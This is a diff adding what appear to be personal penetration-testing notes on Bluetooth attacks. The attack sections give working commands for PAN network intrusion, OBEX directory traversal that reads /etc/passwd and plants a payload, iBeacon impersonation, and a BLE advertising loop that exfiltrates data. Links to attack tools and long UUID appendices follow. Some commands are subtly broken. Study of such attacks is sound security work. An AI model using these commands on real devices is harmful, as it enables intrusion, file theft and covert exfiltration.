+		|						|   Class	|	Class	|2-	|
+		|		11-bit			|	5-bit	|	5-bit	|bit|
+		-----------------------------------------------------
+	Service Classes:
+		Position
+		Networking
+		Rendering
+		Capturing
+		Object Class
+		Audio
+		Telephony
+		Information
+	Major Device Classes
+	0x00	Miscellaneous
+	0x01	Computer
+	0x02	Phone
+	0x03	Netowork Access Point
+			--minor class value changes dynamically in blocks of 4-bit (int 16) values equivelancy reflecting netowork link utilization as a percent value, e.g. minor value 0x01 represents 1-17% usage rate and 0x06 reprersents 83-99% usage rate
+	0x04	Audio/Video
+	0x05	Peripheral
+	0x06	Imaging Device
+	0x07	Wearable
+	0x08	Toy
+	0x09	Healthcare Tech
+	0x1F	Uncategorized
+		--see Bluetooth SIG document "Bluetooth Assigned Access Numbers - Baseband" for minor values
+	Tools:
+	hcitool/hciconfig
+		sudo hcitool inq
+			-retrieve service and device class information for BR/EDR devices
+		hciconfig hci0 class
+			--return local device class information
+		sudo hciconfig hci0 up class 0xf00704 piscan name AskIfImAWatch
+		hciconfig hci0 class
+	btclassify
+		--decode class information
+		git clone https://github.com/mikeryan/btclassify.git
+		python2 btclassify.py 0x3a010c
+Absuing Bluetooth Profiles
+	-test connection access
+	hcidump
+		-create basic L2CAP connection to target
+		sudo apt-get install bluez-hcidump
+		following 2 commands simultaneous (in 2 tmux panes or equivelant):
+		sudo hcidump -t -i hci0
+			-i interface
+			-t add timestamp to output
+			--'<' or '>' in stdout denotes direction of traffic
+		sudo hcitool cc 00:02:EE:6E:72:D3
+			cc - create connection to target
+		-status of the connection attempt returned to hcidump stdout
+Unauthorized PAN Access
+	-Bluetooth Personal Access Network (PAN) profile
+		--ad-hoc network connectiviry for 1+ devices
+	-Bluetooth Network Encapsulation Profile (BNEP)
+	-combining PAN and BNEP devices are able to emulate Ethernet network
+		--transmit ethernet-formatted frames over bluetooth network
+	PAN profiles:
+		NAP (Network Access Point) service
+			-bluetooth device grants access via bridge, router or proxy between piconet and upstream Ethernet network
+			x--presents opportunity to attack network itself
+		GN (Group Ad-hoc Network) service
+			-point-to-point connectivity between piconet devices
+			x--presents opportunity to attack target devices
+	sdptool browse E3:99:D2:66:6A:C3
+		-revealed by standard SDP scan
+	Attack on NAP wifi AP
+	sudo modprobe bnep
+	sudo pand -c E3:99:D2:66:6A:C3 -n
+		--new interface bnep0 will be created if successful
+		--part of BlueZ suite
+	sudo dhclient bnep0
+		--get dhcp client from targeted AP
+	sudo pand -K
+		--kill pand daemon
+	Alternative tool: blueman
+		git clone https://github.com/blueman-project/blueman.git
+		--gui program for bluetooth interfaces using BlueZ
+File Transfer Attacks
+	Bluetooth file transfer profiles:
+		OPP (Object Push Profile)
+			--no feature for file system enumeration, must know target filename
+			--often implemented as multiple services with differing permissions levels
+		OBEX (Object Exchange)
+			--implements FTP
+	sdptool records E3:99:D2:66:6A:C3
+		-enumerate OPP or FTP service profile via SDP
+File Transfer Directory Traversal
+	OPP
+	sudo apt-get install ussp-push
+	ussp-push E3:99:D2:66:6A:C3 malicious.elf ..\\..\\..\\..\\users\\target\\binary
+		-upload payload to target filesystem
+	OBEX-FTP
+	sudo agt-get install obexftp
+	obexftp -b E3:99:D2:66:6A:C3 -l "../../../etc"
+		-list directory
+	sudo obexftp -b E3:99:D2:66:6A:C3 -g "../../../etc/passwd"
+		-retrieve target file
+	sudo obexftp -b E3:99:D2:66:6A:C3 -p malicious.elf -c "../../../users/target/"
+		-push local file to taret directory
+Apple iBeacon attacks
+	--iBeacon uses BLE advertising channels to uniques identify devices using UUID (unique identifier)
+		--include 2 values in advertising messages:
+			Major ID
+				-identifies individual store or collection of iBeacon transmitters
+					--the array of devices transmitting at a specific physical location of an organization
+					--hex byte
+			Minor ID
+				-identifies unique iBeacon transmitter
+					--the specific device an advertising beacon is received from
+					--hex byte
+		--frame containing advertising message, Major ID and Minor ID broadcast in plaintext several times per second
+	--iBeacon leverages signal strength and location data to pinpoint location for location-specific targeting (advertisements, content, push notifications)
+	--Android replicant technology using Android Beacon Library my be succeptable to some attack vectors
+		https://developer.radiusnetworks.com/ibeacon/android
+	iBeacon deployment:
+		-all sensors in iBeacon network share single UUID
+			--uuid selected by macOS uuidgen utility
+				>uuidgen
+		-iOS developer registers app to receive alers when user in range (receives advertising signal) of uuid-specified devices using Apple Core Location Framework
+		--in Objective-C:
+		(void)initRegion {
+			NSUUID *uuid=[[NSUUID alloc] initWithUUIDString:@"72C898A3-8F29-55BB-AE5B-8675309A66BE"];
+			self.beaconRegion=[[CLBeaconRegion alloc] initWithProximityUUID:uuid identifier:@"tld.org.Region"];
+			[self.locationManger startMonitoringForRegion:self.beaconRegion];
+		}
+iBeacon Impersonation
+	x-no securitymechanism exists to protect confidentiality or integrity of BLE advertisement message
+		x--impersonate iBeacon transmitter to manipulate mobile application
+	x--through reverse engineering application and analyzing pcap triggered behaviours can be induced via immitation
+	sudo hciconfig hci0 up noscan leadv
+		--disable inquiry and page scanning on device, enable BLE advertising function of adapter
+	sudo hcitool -i hci0 cmd 0x08 0x0008 1E 02 01 1A 1A FF 4C 00 02 15 72 C8 98 A3 8F 29 55 BB AE 5B 86 75 30 9A 66 BE AC CD 41 CC C5 00
+		-configures adapter with information to include in BLE advertisement
+		0x08		Bluetooth OpCode Group Field (OGF) command to specify BLE controller commands
+		0x0008		Bluetooth OpCode Command Field (OCF) to set BLE advertising data elements
+		1E			advertising header content
+		02			length of field that follows
+		01			Type of Field (flags values)
+		1A			Flags indicating support for BLE and BR/EDR/BLE discoverable
+		1A			length of field that follows (0x1A == 26) in bytes
+		FF			Type of Field (manufacturer-specific values)
+		4C 00		Manufacturer ID (Apple)
+		02			iBeacon Data Type
+		15			length ofdata that follows (0x15 == 21) in bytes
+		72 C8 98 A3
+		8F 29 55 BB 
+		AE 5B 86 75
+		30 9A 66 BE UUID for Org
+		AC CD		Major ID
+		41 CC		Minor ID
+		C5 00		transmit power level
+	iOS Tools:
+	xBeacon
+	RadBeacon
+	x-attack can trigger mobile device application behavior
+	x-if app vulnerable, impersonating iBeacon may be sufficient to induce app to foreground for exploitation
+	x--future deployments of iBeacon may be vulnerable to eavesdropping attacks in which advertising beacon payload content contains more than UUID and Major/Minor ID values
+iBeacon as an exfiltration technique
+	--out of band, if in proximity will evade IDS/IPS and network altogether without needing to phsyically access device from which data will be exfiltrated
+	--payload up to 31 bytes
+	sudo hciconfig hci0 up noscan leadv
+	while true ; do sudo hcitool -i hci0 cmd 0x08 0x0008 1E 02 01 1A 1A FF 4A 57 $(ifconfig eth0 | sed 's/:/: '/g | awk '/RX bytes:/ {printf "%010d,$010d", $3, $8}| xxd -p | sed -e 's/../& /g') 00 00 00 >/dev/null ; sleep 1 ; done
+		--example shows #bytes recieved and transmitted over eth0 encapsulated in iBeacon frame
+		--example no iBeacon standard compliant, Apple manufacturer ID changed and payload could not be contained in Major ID and Minor ID field alone
+			--still an advertising frame that would be recognized as iBeacon and altBeacon data if seen
+		
+
+
+Bluebug Technique:
+	Bluebugger
+	https://packetstormsecurity.com/files/download/54024/bluebugger-0.1.tar.gz
+
+
+Additional Tools:
+	Bluediving
+	http://bluediving.sourceforge.net/
+	--Bluebug, BlueSnarf, BlueSnarf++, BlueSmack, Bluetooth address spoofing, AT and a RFCOMM socket shell, carwhisperer, bss, L2CAP packetgenerator, L2CAP connection resetter, RFCOMM scanner and greenplaque scanning mode (using more than one hci device).
+
+Blueprint
+	https://trifinite.org/trifinite_stuff_blueprinting.html
+	-Bluetooth device reconnaissance and fingerprinting tool
+
+BT_Audit
+	http://www.betaversion.net/btdsd/download/
+
+BTLEJack
+	https://github.com/virtualabs/btlejack
+
+BTProxy-MitM
+	https://github.com/conorpp/btproxy
+
+Carwhisperer
+	https://trifinite.org/trifinite_stuff_carwhisperer.html
+	https://trifinite.org/Downloads/carwhisperer-0.2.tar.gz
+	--Bluetooth passkey is used within the pairing process that takes place, when two Bluetooth enabled devices connect for the first time
+	--passkey is a secret parameter used in the process that generates and exchanges link key
+	--link key is used for authentication and encryption of the information that is exchanged
+	-cw_scanner script is repeatedly performing a device inquiry for visible Bluetooth devices of which the class matches the one of Bluetooth Headsets and Hands-Free Units
+	-cw_scanner script executes the carwhisperer binary that connects to the found device (on RFCOMM channel 1) and opens a control connection and connects the SCO links
+		--carwhiperer binary connects to the device found by the cw_scanner
+	-passkey that is required for the initial connection to the device is provided by the cw_pin.pl script that replaces the official Bluez PIN helper
+	-cw_pin.pl script provides the passkey depending on the Bluetooth address that requests it
+	-pending first three bytes of the address, which references the manufacturer, different passkeys are returned by the cw_pin.sh script
+
+
+
+
+
+	
+Appendix 1:
+	UUID Reference
+	https://www.bluetooth.com/specifications/assigned-numbers/service-discovery/
+Protocol Identifiers
+SDP		0x0001	Bluetooth Core Specification
+UDP		0x0002	[NO USE BY PROFILES]
+RFCOMM	0x0003	RFCOMM with TS 07.10
+TCP		0x0004	[NO USE BY PROFILES]
+TCS-BIN	0x0005	Telephony Control Specification / TCS Binary [DEPRECATED]
+TCS-AT	0x0006	[NO USE BY PROFILES]
+ATT		0x0007	Attribute Protocol
+OBEX	0x0008	IrDA Interoperability
+IP		0x0009	[NO USE BY PROFILES]
+FTP		0x000A	[NO USE BY PROFILES]
+HTTP	0x000C	[NO USE BY PROFILES]
+WSP		0x000E	[NO USE BY PROFILES]
+BNEP	0x000F	Bluetooth Network Encapsulation Protocol (BNEP)
+UPNP	0x0010	Extended Service Discovery Profile (ESDP) [DEPRECATED]
+HIDP	0x0011	Human Interface Device Profile (HID)
+HardcopyControlChannel	0x0012	Hardcopy Cable Replacement Profile (HCRP)
+HardcopyDataChannel	0x0014	See Hardcopy Cable Replacement Profile (HCRP)
+HardcopyNotification	0x0016	Hardcopy Cable Replacement Profile (HCRP)
+AVCTP	0x0017	Audio/Video Control Transport Protocol (AVCTP)
+AVDTP	0x0019	Audio/Video Distribution Transport Protocol (AVDTP)
+CMTP	0x001B	Common ISDN Access Profile (CIP) [DEPRECATED]
+MCAPControlChannel	0x001E	Multi-Channel Adaptation Protocol (MCAP)
+MCAPDataChannel	0x001F	Multi-Channel Adaptation Protocol (MCAP)
+L2CAP	0x0100	Bluetooth Core Specification
+
+Service Class Names
+ServiceDiscoveryServerServiceClassID	0x1000	Bluetooth Core Specification	Service Class
+BrowseGroupDescriptorServiceClassID	0x1001	Bluetooth Core Specification	Service Class
+SerialPort	0x1101	Serial Port Profile (SPP)	Service Class/ Profile
+LANAccessUsingPPP	0x1102	LAN Access Profile	[DEPRECATED]	Service Class/ Profile
+DialupNetworking	0x1103	Dial-up Networking Profile (DUN)	Service Class/ Profile
+IrMCSync	0x1104	Synchronization Profile (SYNC)	Service Class/ Profile
+OBEXObjectPush	0x1105	Object Push Profile (OPP)	Service Class/ Profile
+OBEXFileTransfer	0x1106	File Transfer Profile (FTP)	Service Class/ Profile
+IrMCSyncCommand	0x1107	Synchronization Profile (SYNC)	
+Headset	0x1108	Headset Profile (HSP)	Service Class/ Profile
+CordlessTelephony	0x1109	Cordless Telephony Profile (CTP)	[DEPRECATED]	Service Class/ Profile
+AudioSource	0x110A	Advanced Audio Distribution Profile (A2DP)	Service Class
+AudioSink	0x110B	Advanced Audio Distribution Profile (A2DP)	Service Class
+A/V_RemoteControlTarget	0x110C	Audio/Video Remote Control Profile (AVRCP)	Service Class
+AdvancedAudioDistribution	0x110D	Advanced Audio Distribution Profile (A2DP)	Profile
+A/V_RemoteControl	0x110E	Audio/Video Remote Control Profile (AVRCP)	Service Class/ Profile
+A/V_RemoteControlController	0x110F	Audio/Video Remote Control Profile (AVRCP)	Service Class
+Intercom	0x1110	Intercom Profile (ICP)	Service Class
+Fax	0x1111	Fax Profile (FAX)	[DEPRECATED]	Service Class
+Headset – Audio Gateway (AG)	0x1112	Headset Profile (HSP)	Service Class
+WAP	0x1113	Interoperability Requirements for Bluetooth technology as a WAP, Bluetooth SIG [DEPRECATED]	Service Class
+WAP_CLIENT	0x1114	Interoperability Requirements for Bluetooth technology as a WAP, Bluetooth SIG [DEPRECATED]	Service Class
+PANU	0x1115	Personal Area Networking Profile (PAN)	Service Class / Profile
+NAP	0x1116	Personal Area Networking Profile (PAN)	Service Class / Profile
+GN	0x1117	Personal Area Networking Profile (PAN)	Service Class / Profile
+DirectPrinting	0x1118	Basic Printing Profile (BPP)	Service Class
+ReferencePrinting	0x1119	See Basic Printing Profile (BPP)	Service Class
+Basic Imaging Profile	0x111A	Basic Imaging Profile (BIP)	Profile
+ImagingResponder	0x111B	Basic Imaging Profile (BIP)	Service Class
+ImagingAutomaticArchive	0x111C	Basic Imaging Profile (BIP)	Service Class
+ImagingReferencedObjects	0x111D	Basic Imaging Profile (BIP)	Service Class
+Handsfree	0x111E	Hands-Free Profile (HFP)
+HandsfreeAudioGateway	0x111F	Hands-free Profile (HFP)	Service Class
+DirectPrintingReferenceObjectsService	0x1120	Basic Printing Profile (BPP)	Service Class
+ReflectedUI	0x1121	Basic Printing Profile (BPP)	Service Class
+BasicPrinting	0x1122	Basic Printing Profile (BPP)	Profile
+PrintingStatus	0x1123	Basic Printing Profile (BPP)	Service Class
+HumanInterfaceDeviceService	0x1124	Human Interface Device (HID)
+HardcopyCableReplacement	0x1125	Hardcopy Cable Replacement Profile (HCRP)	Profile
+HCR_Print	0x1126	Hardcopy Cable Replacement Profile (HCRP)	Service Class
+HCR_Scan	0x1127	Hardcopy Cable Replacement Profile (HCRP)	Service Class
+Common_ISDN_Access	0x1128	Common ISDN Access Profile (CIP)	[DEPRECATED]	Service Class / Profile
+SIM_Access	0x112D	SIM Access Profile (SAP)	Service Class / Profile
+Phonebook Access – PCE	0x112E	Phonebook Access Profile (PBAP)	Service Class
+Phonebook Access – PSE	0x112F	Phonebook Access Profile (PBAP)	Service Class
+Phonebook Access	0x1130	Phonebook Access Profile (PBAP)	Profile
+Headset – HS	0x1131	Headset Profile (HSP)
+Message Access Server	0x1132	Message Access Profile (MAP)	Service Class
+Message Notification Server	0x1133	Message Access Profile (MAP)	Service Class
+Message Access Profile	0x1134	Message Access Profile (MAP)	Profile
+GNSS	0x1135	Global Navigation Satellite System Profile (GNSS)	Profile
+GNSS_Server	0x1136	Global Navigation Satellite System Profile (GNSS)	Service Class
+​3D Display	0x1137​	​3D Synchronization Profile (3DSP)	Service Class​
+​3D Glasses	​0x1138	​3D Synchronization Profile (3DSP)	​Service Class
+​3D Synchronization	0x1139​	​3D Synchronization Profile (3DSP)	​Profile
+​MPS Profile UUID	​0x113A	​Multi-Profile Specification (MPS)	​Profile
+​MPS SC UUID	​0x113B	​Multi-Profile Specification (MPS)	​Service Class
+​CTN Access Service​	​0x113C​	​Calendar, Task, and Notes (CTN) Profile	​Service Class
+​CTN Notification Service​	​0x113D	​​Calendar Tasks and Notes (CTN) Profile	​Service Class
+​CTN Profile	​0x113E	​​Calendar Tasks and Notes (CTN) Profile	​Profile
+PnPInformation	0x1200	Device Identification (DID)	Service Class / Profile
+GenericNetworking	0x1201	N/A	Service Class
+GenericFileTransfer	0x1202	N/A	Service Class
+GenericAudio	0x1203	N/A	Service Class
+GenericTelephony	0x1204	N/A	Service Class
+UPNP_Service	0x1205	Enhanced Service Discovery Profile (ESDP) [DEPRECATED]	Service Class
+UPNP_IP_Service	0x1206	Enhanced Service Discovery Profile (ESDP) [DEPRECATED]	Service Class
+ESDP_UPNP_IP_PAN	0x1300	Enhanced Service Discovery Profile (ESDP) [DEPRECATED]	Service Class
+ESDP_UPNP_IP_LAP	0x1301	Enhanced Service Discovery Profile (ESDP)[DEPRECATED]	Service Class
+ESDP_UPNP_L2CAP	0x1302	Enhanced Service Discovery Profile (ESDP)[DEPRECATED]	Service Class
+VideoSource	0x1303	Video Distribution Profile (VDP)	Service Class
+VideoSink	0x1304	Video Distribution Profile (VDP)	Service Class
+VideoDistribution	0x1305	Video Distribution Profile (VDP)	Profile
+HDP	0x1400	Health Device Profile	Profile
+HDP Source	0x1401	Health Device Profile (HDP)	Service Class
+HDP Sink	0x1402	Health Device Profile (HDP)	Service Class
+Universal Attributes
+ServiceRecordHandle	0x0000
+ServiceClassIDList	0x0001
+ServiceRecordState	0x0002
+ServiceID	0x0003
+ProtocolDescriptorList	0x0004
+BrowseGroupList	0x0005
+LanguageBaseAttributeIDList	0x0006
+ServiceInfoTimeToLive	0x0007
+ServiceAvailability	0x0008
+BluetoothProfileDescriptorList	0x0009
+DocumentationURL	0x000A
+ClientExecutableURL	0x000B
+IconURL	0x000C
+AdditionalProtocolDescriptorLists	0x000D
+
+
+Appedix 2:
+	Software:
+Win:
+https://www.nirsoft.net/utils/bluetooth_viewer.html
+
+*nix:
+https://github.com/nccgroup/BLE-Replay
+https://github.com/nccgroup/BLESuite
+https://github.com/nccgroup/BLESuite-CLI
+https://github.com/merculite/BLE-Security
+https://github.com/blueman-project/blueman.git
+https://github.com/mikeryan/btclassify.git
+https://github.com/mikeryan/btcrack.git
+https://github.com/mikeryan/crackle.git
+https://github.com/greatscottgadgets/ubertooth
+https://github.com/greatscottgadgets/libbtbb
+
+Linux Packages:
+bluetooth
+libbluetooth3
+libbluetooth-dev
+libbtbb1
+bluez-firmware
+firmware-atheros
+firmware-iwlwifi
+firmware-misc-nonfree
+firmware-realtek
+bluez
+bluez-firmware
+bluez-tools
+bluez-test-scripts
+bluez-test-tools
+bluez-cups
+bluez-hcidump
+bluez-obexd
+libkf5bluezqt6
+libkf5bluezqt-data
+libkf5bluezqt-doc
+ubertooth
+libubertooth1
+libubertooth-dev
+libbtbb1
+libbtbb-dev
+libqt5bluetooth5
+libqt5bluetooth5-bin
+ussp-push
+ussp-push-dbg
+redfang
+btscanner
+libobexftp0
+libobexftp0-dev
+obexfs
+obexftp
+obex-data-server
+neard
+gnome-bluetooth
+kismet
+kismet-plugins
+bluesnarfer
+blueranger
+blueman
+bluelog
+bluedevil
+spooftooph
+libhidapi=hidraw0
+libhidapi-libusb0
+libgnome-bluetooth13
+libgnome-bluetooth-dev
+gnome-bluetooth
+gir1.2-gnomebluetooth-1.0
+bluewho
+libopenobex2
+libopenobex2-dev
+connman
+connman-dev
+connman-gtk
+asterisk-mobile
+
+iOS
+LightBlue Explorer
+xBeaconPlus
+RadBeacon
+Locate Beacon
+nRF Connect
+MQTTool
